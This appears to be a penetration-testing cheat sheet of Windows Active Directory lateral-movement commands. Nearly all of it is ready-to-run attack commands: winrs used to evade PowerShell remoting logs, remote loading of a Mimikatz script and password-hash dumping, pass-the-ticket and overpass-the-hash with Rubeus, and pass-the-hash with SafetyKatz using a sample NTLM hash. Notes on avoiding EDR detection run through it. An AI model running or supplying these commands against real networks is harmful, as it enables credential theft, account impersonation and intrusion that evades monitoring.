## Winrs
>**ℹ️ Info:**
>We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts).

```cmd
# With local credentials
winrs -remote:server1 -u:.\administrator - p:Pass@1234 cmd

# With domain credentials
winrs -remote:server1 -u:contoso.local\administrator - p:Pass@1234 cmd
```
---
## PowerShell Remoting

**Connect to a machine:**
```powershell
Enter-PSSession -Computername <COMPUTERNAME>
```

**Connect to a machine and save the session:**
```powershell
$sess = New-PSSession -Computername <COMPUTERNAME>
Enter-PSSession $sess
```

**Load script to a machine:**
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
```

**Execute command or scriptblock:**
```powershell
Invoke-Command –Scriptblock ${function:Get-PassHashes} -Session $sess
```

**Execute locally loaded function to a machine:**
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -Session $sess -ArgumentList
```

--- 
## Pass-The-Ticket
Injects a TGT into the current session to impersonate the owner of it

### Rubeus
```cmd
# Inject TGT into current session
Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooI...
```

>**ℹ️ Info:**
>More OPSEC-friendly than OverPass-The-Hash since we are reusing a TGT instead of asking for a new one.

---
## Pass-The-Hash
Use a NTLM hash to authenticate against NTLM.
### SafetyKatz
```cmd
# Spawn a cmd session
SafetyKatz.exe '"sekurlsa::pth /domain:contoso.local /user:Administrator /ntlm:917ecdd1b4287f7051542d0241900cf0"'

# Spawn a powershell session
SafetyKatz.exe '"sekurlsa::pth /domain:contoso.local /user:Administrator /ntlm:917ecdd1b4287f7051542d0241900cf0 /run:powershell.exe"'
```

---
## OverPass-The-Hash
Use a NTLM hash or AES key to authenticate against kerberos.

### Rubeus
```cmd
# With an NTLM hash (Usually flagged by EDRs)
Rubeus.exe asktgt /domain:contoso.local /user:administrator /rc4: /ptt

# With an AES-128 key (Admin cmd required)
Rubeus.exe asktgt /domain:contoso.local /user:administrator /aes128: /ptt

# With an AES-256 key (Admin cmd required)
Rubeus.exe asktgt /domain:contoso.local /user:administrator /aes256: /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
>**ℹ️ Info:**
>AES-256 key is more OPSEC-friendly than the others.

---
## RunAs
```cmd
# Run network related stuff with password
runas /netonly /user:techcorp.local\MSOL_16fb75d0227d cmd.exe
```